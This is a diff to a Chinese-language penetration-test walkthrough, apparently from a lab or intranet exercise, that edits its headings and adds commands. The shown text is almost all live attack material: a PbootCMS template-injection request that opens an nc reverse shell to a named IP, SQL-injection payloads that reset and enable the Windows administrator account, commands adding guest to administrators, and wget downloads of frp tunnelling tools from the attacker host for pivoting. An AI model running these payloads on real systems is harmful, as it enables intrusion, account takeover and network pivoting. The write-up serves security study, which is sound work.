@@ -62,7 +62,7 @@ GET /?a=}{pboot{user:password}:if(("sys\x74em")("rm /tmp/f;mkfifo /tmp/f;cat /tm
 nc -lvnp 1111
 ```
 
-burp发送
+### burp发送
 ```bash
 GET /?a=}{pboot{user:password}:if(("sys\x74em")("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 101.132.149.233 1111 >/tmp/f"));//)}xxx{/pboot{user:password}:if} HTTP/1.1
 Host: 39.101.138.52
@@ -76,7 +76,7 @@ Cookie: lg=cn; PbootSystem=vs69gaa7if3h1s7hs3vq2beq8a
 Connection: close
 ```
 
-稳定shell
+### 稳定shell
 ```bash
 script /dev/null -c bash 
 Ctrl+Z 
@@ -272,12 +272,19 @@ name=admin' union select null,(select execute_command('ipconfig') from dual),nul
 ![](file-20260708144517037.png)
 
 此时，添加一个本地管理员用户 RDP 上去进行操作比较方便。
-```
+```bash
 net user administrator abc123!@#
 net user administrator /active:yes
 或
 net user guest /active:yes
 net localgroup administrators guest /add
+```
+
+burp完成命令
+```bash
+name=admin' union select null,(select execute_command('net user administrator abc123!@#') from dual),null from dual--
+
+name=admin' union select null,(select execute_command('net user administrator /active:yes') from dual),null from dual--
 ```
 ## 搭建frp代理
 阿里云入方向规则放行6000和7000端口，有防火墙还要再次执行
@@ -287,6 +294,9 @@ ufw allow 6000/tcp
 ```
 
 ### frps-阿里云服务端
+
+
+
 ```bash
 ecs-user@iZuf6cpbx5hvqmv33pteu2Z /h/frp_0.65.0_linux_amd64> ./frps -c ./frps.toml
 2026-06-01 14:36:53.215 [I] [proxy/tcp.go:82] [5aee9f15ef905c3b] [plugin_socks5] tcp proxy listen port [6000]
@@ -294,6 +304,13 @@ ecs-user@iZuf6cpbx5hvqmv33pteu2Z /h/frp_0.65.0_linux_amd64> ./frps -c ./frps.tom
 ```
 
 ### frpc-靶机端（PBOOTCMS）
+
+下载frpc客户端和配置文件
+````bash
+wget http://101.132.149.233:4444/frpc.toml
+wget http://101.132.149.233:4444/frpc 
+````
+
 ```bash
 wget http://101.132.149.233:4444/frpc.toml
 www-data@iZ8vbgyjachs4g5pjgaopzZ:/tmp$ chmod 777 ./frpc
